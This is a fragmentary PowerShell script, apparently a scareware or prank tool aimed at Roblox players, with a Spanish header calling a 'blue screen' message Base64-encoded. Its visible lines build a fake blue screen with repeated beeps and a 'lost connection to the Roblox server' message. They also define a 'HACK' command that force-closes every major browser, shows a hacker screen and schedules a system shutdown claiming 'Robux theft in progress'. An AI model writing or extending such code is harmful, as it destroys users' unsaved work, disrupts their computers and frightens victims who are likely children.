...
# Mensaje "Pantalla Azul" en Base64
...
$c7 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''DarkBlue'';$Host.UI.RawUI.ForegroundColor=''White'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 12;`$i++){[Console]::Beep(400,100);[Console]::Beep(600,100)};Read-Host ''CONEXION PERDIDA CON EL SERVIDOR DE ROBLOX''"' + "`n"
...
$c20 = '            "HACK" { Get-Process chrome, msedge, firefox, brave -ErrorAction SilentlyContinue | Stop-Process -Force; $m1 = if($partes.Count -gt 1){$partes[1]}else{"ACCESO BLOQUEADO"}; $m2 = if($partes.Count -gt 2){$partes[2]}else{"ERROR CRITICO DE SERVIDOR"}; MostrarHacker $m1 $m2; shutdown.exe /s /t 60 /c "Robo de robuks en progreso... atte: PEKU MEXICO." }' + "`n"
$c21 = '        }' + "`n"
